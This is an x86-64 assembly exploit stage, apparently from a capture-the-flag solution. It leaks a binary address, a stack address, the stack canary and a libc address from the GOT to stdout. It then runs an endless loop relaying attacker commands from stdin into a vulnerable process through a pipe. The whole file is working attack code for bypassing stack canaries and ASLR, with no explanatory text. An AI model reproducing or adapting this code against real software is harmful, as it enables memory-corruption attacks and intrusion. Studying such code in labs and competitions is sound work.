BITS 64

init:
  ; save pipe descriptors
  mov r8, rdi
  mov r9, rsi

  ; signal start of proxy
  mov rax, 0x1337deadbeef
  push rax
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax

  ; leak binary's addres from return address (it's on top of stack now)
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write

  ; leak stack address from rsp
  push rsp
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax

  ; leak canary from its storage
  mov rax, fs:0x28
  push rax
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax

  ; leak libc from GOT
  mov rax, qword [rsp]
  add rax, 0x398d
  push qword [rax]
  mov rdi, 0x01
  mov rsi, rsp
  mov rdx, 0x08
  call write
  pop rax

; infinite proxy cycle 
proxy:
  ; clear buffer
  mov rdi, rsp
  call clear

  ; read command from stdin
  mov rdi, 0x00
  mov rsi, rsp
  mov rdx, 0x108
  call read

  ; forward command to vulnerable process
  mov rdi, r9
  mov rsi, rsp
  mov rdx, 0x108
  call write

  ; repeat
  jmp proxy

read:
  push 0x00
  pop rax
  syscall
  ret

write:
  push 0x01
  pop rax
  syscall
  ret

clear:
  mov rcx, 0x00
  loop:
    mov qword [rdi], 0x00
    add rdi, 0x08
    add rcx, 0x08
    cmp rcx, 0x108
    jl loop
  ret
